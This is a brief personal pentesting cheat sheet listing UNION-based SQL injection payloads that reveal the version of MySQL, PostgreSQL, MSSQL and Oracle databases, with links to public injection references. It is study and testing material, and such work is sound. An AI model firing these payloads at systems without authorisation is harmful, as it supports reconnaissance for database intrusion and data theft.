---
note_tags:
  - sqli
  - database
  - fingerprint
---
# Identify SQL engine

**Author:** Julien Bongars\
**Date:** 2025-09-20 17:16:00
**Path:**

---

## MySQL

```sql
' UNION SELECT @@version--
' UNION SELECT version()--
```

## PostgreSQL

```sql
' UNION SELECT version()--
```

## MSSQL

```sql
' UNION SELECT @@version--
```

## Oracle

```sql
' UNION SELECT banner FROM v$version--
```

## Resources

- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) — engine fingerprints
- [HackTricks — SQL Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html) — DBMS identification
